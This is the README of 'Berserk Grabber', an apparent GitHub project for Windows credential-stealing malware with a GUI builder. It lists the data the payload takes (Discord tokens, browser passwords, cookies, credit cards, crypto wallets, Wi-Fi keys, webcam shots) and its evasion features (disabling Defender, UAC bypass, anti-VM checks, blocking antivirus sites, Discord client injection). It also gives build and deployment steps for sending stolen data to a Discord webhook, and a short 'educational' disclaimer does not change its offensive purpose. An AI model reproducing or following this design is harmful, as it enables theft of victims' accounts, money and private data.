<h1 align="center">
  Berserk Grabber
</h1>

<p align="center">
  <img src="gui_images/Berserk.ico" alt="Berserk-Grabber">
</p>

<p align="center">
  <strong>Configurable information grabber for Windows</strong> — Built with a GUI builder (Berserk Builder).
</p>

<div align="center">
  <br>
  <img src="https://img.shields.io/github/languages/top/BenzoXdev/Berserk-Grabber?color=e74c3c">
  <img src="https://img.shields.io/github/stars/BenzoXdev/Berserk-Grabber?color=e74c3c&logoColor=e74c3c">
  <br>
  <img src="https://img.shields.io/github/commit-activity/w/BenzoXdev/Berserk-Grabber?color=e74c3c">
  <img src="https://img.shields.io/github/last-commit/BenzoXdev/Berserk-Grabber?color=e74c3c&logoColor=e74c3c">
  <br>
  <img src="https://img.shields.io/github/issues/BenzoXdev/Berserk-Grabber?color=e74c3c&logoColor=e74c3c">
  <img src="https://img.shields.io/github/issues-closed/BenzoXdev/Berserk-Grabber?color=e74c3c&logoColor=e74c3c">
  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px; border-color: #e74c3c;" noshade="" size="20" width="100%">
</div>

---

## About

**Berserk Grabber** is a configurable information grabber for Windows, shipped with a graphical builder (Berserk Builder). The code is based on various open-source grabber projects, heavily modified and extended.

| Item | Detail |
|------|--------|
| **Repository** | [https://github.com/BenzoXdev/Berserk-Grabber](https://github.com/BenzoXdev/Berserk-Grabber) |
| **Creator** | benzoXdev |
| **Platform** | Windows only |
| **Python** | 3.11+ recommended |

---

## Table of Contents

- [Features](#features)
- [Configuration Options](#configuration-options)
- [Installation](#installation)
- [Usage](#usage)
- [Data Structure Sent to Webhook](#data-structure-sent-to-webhook)
- [To Do](#to-do)
- [Disclaimer](#disclaimer)

---

## Features

### Discord

| Feature | Detail |
|---------|--------|
| **Tokens** | Grabs Discord tokens from Discord, Canary, PTB, Lightcord and from browsers (Chrome, Edge, Brave, Opera, Opera GX, Firefox, etc.) |
| **Encrypted tokens** | Decrypts tokens stored in `dQw4w9WgXcQ:` format (DPAPI + AES-GCM) |
| **Profile** | ID, display name, email, phone, avatar (PNG/GIF) |
| **2FA** | MFA enabled/disabled status |
| **Nitro** | Subscription type (Classic, Nitro, Nitro Basic) |
| **Billing** | Payment methods (card, PayPal) |
| **Badges** | Staff, Partner, HypeSquad, Bug Hunter, Early Supporter, etc. |
| **HQ Friends** | Friends with badges (Staff, Partner, HypeSquad, etc.) |
| **HQ Guilds** | Servers where the user is owner or admin, with invite link and member count |
| **Gift Codes** | Outbound promo codes and Nitro gift codes |
| **Backup Codes** | Discord 2FA recovery codes (file `discord_backup_codes.txt` in Downloads) |
| **Screenshot** | Desktop capture sent via webhook |
| **Webcam** | Webcam photo capture (if available) |

### Browsers

Supports **Chrome, Chrome SxS, Edge, Brave, Opera, Opera GX, Vivaldi, Yandex, Epic Privacy, CentBrowser, 7Star, Sputnik, Kometa, Orbitum, Iridium, Uran**.

| Data | File / Detail |
|------|----------------|
| **Cookies** | Export per browser/profile (host_key, name, path, encrypted value, expiration) |
| **Passwords** | Decrypted via master key (Local State) — URL, username, password |
| **History** | URLs and visit count |
| **Downloads** | Download history (URL, target path, browser) |
| **Credit cards** | Name on card, expiration month/year, number (decrypted) |
| **Bookmarks** | Bookmarks (bookmark bar, Other, Synced) |
| **Autofill** | Autofill form data (option **Autofills**) |

### Games & Sessions

| Module | Content |
|--------|---------|
| **Roblox** | `.ROBLOSECURITY` cookie, username, Robux balance — sent in a dedicated Discord embed |
| **Minecraft** | `launcher_accounts.json` (sessions) and `usercache.json` (user cache) |
| **Growtopia** | `save.dat` file (found via Start Menu shortcuts) |

### Crypto & Wallets

**Crypto** option: copies data folders for:

- **Wallets**: Zcash, Armory, Bytecoin, Guarda, Atomic Wallet, Exodus, Binance, Jaxx Liberty, Electrum, Coinomi, Trust Wallet, AtomicDEX, Wasabi, Ledger Live, Trezor Suite, Blockchain, Mycelium, Crypto.com, BRD, Coinbase Wallet, Zerion |
- **Launchers**: Steam (config), Riot Games, Epic Games, Rockstar, Uplay |
- **Apps**: Telegram (tdata) |

### Common Files

Searches **Desktop, Pictures, Documents, Music, Videos, Downloads, Recent, OneDrive** for files whose name contains keywords (secret, password, wallet, backup, 2fa, metamask, etc.) or whose extension is `.txt`, `.doc`, `.pdf`, etc. Max file size: 2 MB.

### Network & System

| Item | Detail |
|------|--------|
| **Wi‑Fi** | Windows Wi‑Fi profiles and passwords (netsh) — file `Wifi Passwords.txt` |
| **PC Info** | Sent in Discord embed: Windows user, machine name, OS, public IP, MAC, HWID (product UUID), CPU, GPU, RAM (GB), detected antivirus |

### Discord Injection

- Downloads an injection script (JS) from an external repository.
- Replaces `index.js` in the `discord_desktop_core` module (app-*).
- On next Discord launch: automatically sends token, password and email to the webhook (on login or password change).
- Supported: Discord, Discord Canary, Discord PTB, Discord Development.

### General Functions (Security / Evasion)

| Option | Description |
|--------|-------------|
| **Anti Spam** | Only one execution allowed per 60-second window (file `dd_setup.txt` in `%TEMP%`) |
| **Fake Error** | Shows a "Fatal Error" message box (import error) to hide execution |
| **Startup** | Copies the executable to the Windows Startup folder |
| **Defender** | Disables some Windows Defender protections (PowerShell) and adds exclusions |
| **Block AV sites** | Adds domains to the `hosts` file (VirusTotal, Hybrid Analysis, Any.Run, Kaspersky, Norton, etc.) to block access |
| **Kill Token Protector** | Disables Discord Token Protector (removes executables/DLL, modifies `config.json`) |
| **Anti-Debug / VM** | Detection: blacklisted users, PC names, HWIDs, IPs, MACs and processes (debuggers, VM, analysis); RDP; GPU/Disk registry; VMware/VirtualBox DLLs; specs (RAM ≤ 2 GB, disk ≤ 50 GB, 1 CPU) — process exits if detected |
| **Mutex** | Single instance only (CreateMutex) |
| **UAC Bypass** | UAC bypass via fodhelper + registry (frozen exe mode only) |
| **Bound EXE** | Runs a second exe (base64-encoded in config); **Bound Run Startup** option to also copy it to startup |
| **Self Destruct** | Deletes the executable after run (frozen mode: background `del` cmd then exit) |

### Build / Output

- **Obfuscation**: Builder option to obfuscate the code.
- **Icon**: Custom exe icon.
- **File Pumper**: Increases file size.
- **Low Detections**: Aim for low antivirus detection (depends on build).

---

## Configuration Options

The `Berserk.py` file uses a `__CONFIG__` dictionary (or equivalent generated by the builder) with the following keys:

| Key | Type | Description |
|-----|------|-------------|
| `webhook` | str | Discord webhook URL |
| `ping` | bool | Enable ping (Everyone/Here) |
| `pingtype` | str | `"Everyone"` or `"Here"` |
| `error` | bool | Fake Error |
| `startup` | bool | Add to startup |
| `defender` | bool | Disable Defender / exclusions |
| `block_av_sites` | bool | Block AV domains in hosts |
| `systeminfo` | bool | Send PC info (PcInfo) |
| `backupcodes` | bool | Grab Discord backup codes |
| `browser` | bool | Cookies, passwords, history, cards, bookmarks, downloads, autofills |
| `roblox` | bool | Roblox cookies + Roblox Info embed |
| `obfuscation` | bool | Obfuscation (handled by builder) |
| `injection` | bool | Discord Injection |
| `minecraft` | bool | Minecraft session + usercache |
| `wifi` | bool | Wi‑Fi passwords |
| `killprotector` | bool | Bypass Discord Token Protector |
| `antidebug_vm` | bool | Anti-Debug / anti-VM |
| `discord` | bool | Tokens + Discord profile + screenshot + webcam |
| `anti_spam` | bool | Limit 1 execution per 60 s |
| `self_destruct` | bool | Delete exe after execution |
| `crypto` | bool | Session Files (wallets, launchers, Telegram) |
| `autofills` | bool | Browser autofill data |
| `common_files` | bool | Common files (keywords + extensions) |
| `mutex` | str | Mutex name (single instance) |
| `uac_bypass` | bool | UAC bypass (fodhelper) |
| `growtopia` | bool | Growtopia save.dat file |
| `bound_exe` | str | Secondary exe (base64) |
| `bound_run_startup` | bool | Copy bound exe to startup |

---

## Installation

### 1. Python

Install **Python 3.11+** and ensure it is added to your **PATH**.

### 2. Download

Download the project and extract the archive.

### 3. Dependencies (setup.bat)

Run **setup.bat** to install Python modules (no manual install needed). Then run **run.bat** as **administrator** to open the builder interface.

### 4. Discord Webhook

Create a webhook in a Discord channel (Channel Settings → Integrations → Webhooks). Paste the URL into the builder field. **Do not delete the webhook** if you want to receive logs.

### 5. Options

Check the options you want (Discord, browsers, injection, anti-VM, etc.). See the documentation or this README for each option’s details.

### 6. Build

Generate the executable from the builder. The `.exe` file appears in the project folder with the name you set.

---

## Usage

1. **Builder**: Run `run.bat` (as admin), configure webhook + options, then build.
2. **Stub execution**: The generated exe runs on the target machine; data is sent to the webhook (Discord embeds + ZIP file if browser/Roblox/Wi‑Fi/Minecraft/backup codes/crypto/common files/Growtopia are enabled).
3. **ZIP file**: Contains folders `Browser`, `Wifi`, `Minecraft`, `Discord`, `Session Files`, `Common Files`, `Games/Growtopia` depending on options. Filename: `Berserk-Logged-{username}.zip`.

---

## Data Structure Sent to Webhook

- **Webhook**: Sends with username `Berserk` and set avatar.
- **Ping**: `@everyone` or `@here` if enabled.
- **ZIP file**: Sent as attachment if at least one of (roblox, browser, wifi, minecraft, backupcodes, crypto, common_files, growtopia) is enabled.
- **Embeds**:
  - **System Info**: One embed with all PC info (if `systeminfo`).
  - **Discord**: One embed per token (profile, 2FA, Nitro, billing, HQ Friends, HQ Guilds, Gift Codes, token).
  - **Roblox Info**: One embed (name, Robux, cookie) if `roblox` and cookie found.
  - **Desktop Screenshot**: One image (and optionally webcam).

Embed fields are trimmed to 1024 characters when needed (Discord limit).
---
## GUI

<div align="center">
    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/Yd9bfhH.png"></img>
</div>
---

## To Do

- [ ] FUD (Fully Undetectable) function
- [ ] Maybe integrated AI

---

## Disclaimer

This project is provided **for educational and security research purposes only**. Using it to steal credentials, tokens or personal data without consent is **illegal**. The authors are not responsible for misuse.

---

<div align="center">
  <strong>Berserk Grabber</strong> — Created by benzoXdev
</div>
